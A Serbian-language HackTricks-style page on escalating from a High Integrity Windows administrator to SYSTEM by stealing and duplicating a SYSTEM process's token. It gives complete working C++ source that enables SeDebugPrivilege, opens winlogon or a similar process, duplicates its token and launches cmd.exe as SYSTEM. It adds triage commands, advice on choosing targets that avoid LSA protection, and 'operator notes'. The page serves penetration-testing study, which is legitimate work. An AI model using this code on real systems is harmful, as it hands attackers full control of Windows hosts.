# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Ova stranica govori o **ručnoj** verziji prelaska sa **High Integrity administrator procesa** na **`NT AUTHORITY\SYSTEM`** tako što se **otvori nezaštićeni SYSTEM proces, duplira njegov token i pokrene child process sa tim tokenom**.

Ako imate samo **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, ali **ne možete da otvorite odgovarajući SYSTEM proces**, **Potato / named-pipe** put je obično pouzdaniji:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Ako vam ne treba samo `SYSTEM`, već **SYSTEM token sa što više privilegija**, pogledajte i:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Pre nego što pokušate da ukradete token, brzo proverite kontekst:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktične napomene:

- **High Integrity** admin token je obično dovoljan da se **omogući `SeDebugPrivilege`** i otvore mnogi ne-zaštićeni SYSTEM procesi.
- **`CreateProcessWithTokenW` zahteva `SeImpersonatePrivilege`** na pozivatelju. Ako taj API padne sa `1314`, pređi na `CreateProcessAsUserW` nakon što već dupliraš SYSTEM primary token.
- Na modernom Windows-u, **`lsass.exe` je često loša meta** jer **LSA protection / PPL** blokira pristup čak i administratorima sa `SeDebugPrivilege`. Radije koristi **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ili rani **`svchost.exe`** koji radi kao SYSTEM.
- Nije svaki SYSTEM proces jednako koristan. Ako dobiješ SYSTEM, ali primetiš da nedostaju privilegije, probaj drugi SYSTEM proces umesto da pretpostaviš da je tehnika pokvarena.

## Pažljivo izaberi PID

Najlakši način da ovo radi pouzdano je da **izabereš SYSTEM proces čiji DACL zapravo dozvoljava Administrators da upitaju proces i dupliraju njegov token**.

Dobri kandidati za prvo testiranje:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- neke rane `svchost.exe` instance koje rade kao SYSTEM

Podrazumevano izbegavaj:

- `lsass.exe` na hostovima gde je omogućeno **RunAsPPL / LSA protection**
- zaštićene / bezbednosno osetljive procese koji vraćaju `Access denied` čak i nakon omogućavanja `SeDebugPrivilege`

Možeš da pregledaš kandidatske procese i njihove tokene/ACL-ove pomoću **Process Explorer** ili **Process Hacker** pokrenutih sa povišenim privilegijama.

### Code

Sledeći kod je iz [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Omogućava da **navedeš Process ID kao argument** i pokreneće se CMD **sa korisnikom** navedenog procesa.\
Ako se pokrene u High Integrity procesu, možeš da **navedeš PID procesa koji radi kao System** (kao `winlogon`, `wininit`) i pokreneš `cmd.exe` kao SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Korisni API / prava pristupa

Primer koristi `MAXIMUM_ALLOWED`, ali za stvarne operacije je korisno zapamtiti minimalne potrebne delove:

- `OpenProcessToken()` zahteva samo da je **handle procesa** otvoren sa **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Za korišćenje `CreateProcessWithTokenW()`, **primary token handle** mora imati **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- `DuplicateTokenEx()` mora da napravi **primary token** (`TokenPrimary`), a ne samo impersonation token.
- Ako si već impersonirao SYSTEM i `CreateProcessWithTokenW()` i dalje pada sa `1314`, probaj umesto toga `CreateProcessAsUserW()`.

To znači da je **otvaranje target procesa sa `PROCESS_ALL_ACCESS` obično nepotrebno i bučnije** nego samo traženje prava potrebnih za upit tokena.

## Greška

Ponekad možeš pokušati da impersoniraš System i to neće raditi, uz izlaz poput sledećeg:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
To znači da čak i ako radiš na High Integrity nivou **nemaš dovoljno permissions** nad tim target process/token.\
Hajde da proverimo trenutne Administrator permissions nad `svchost.exe` procesima pomoću **Process Explorer** (ili možeš koristiti i **Process Hacker**):

1. Izaberi `svchost.exe` process
2. Right Click --> Properties
3. Unutar "Security" taba klikni dole desno na dugme "Permissions"
4. Klikni na "Advanced"
5. Izaberi "Administrators" i klikni na "Edit"
6. Klikni na "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Prethodna slika sadrži sve privileges koje "Administrators" imaju nad izabranim procesom (kao što vidiš, u slučaju `svchost.exe` imaju samo "Query" privileges)

Pogledaj privileges koje "Administrators" imaju nad `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Unutar tog process-a "Administrators" mogu da "Read Memory" i "Read Permissions", što verovatno omogućava Administrators da impersonate token koji koristi ovaj process.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL te blokira, ili je target **protected/PPL**. Izaberi drugi SYSTEM process.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: handle tvog token-a je otvoren bez dovoljno prava, ili target token DACL sprečava duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: caller trenutno nema omogućeno **`SeImpersonatePrivilege`**. Pokušaj prvo da ga enable-uješ ili koristi `CreateProcessAsUserW()` sa duplicated primary token-om.
- **`CreateProcessWithTokenW()` -> `1326`** nakon prethodnih failure-a: ovo često samo znači da je prethodni token duplication/impersonation korak fail-ovao, pa ne postoji usable primary token za pokretanje child process-a.

## Operator notes

- Ova technique je odlična kada si već **local admin + high integrity** i samo želiš brz, manual path do SYSTEM bez pokretanja service ili named-pipe coercion chain.
- Na hardened Windows 11 / Server environment-ima, **LSA protection** je sve češća, pa je workflow koji pretpostavlja da je `lsass.exe` uvek readable krhak. **`winlogon.exe` / `wininit.exe` / `services.exe` su obično bolji prvi izbori**.
- Ako završiš u **service account** context-u umesto u elevated admin desktop-u, porodica **Potato** je obično bolji fit od ove stranice.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
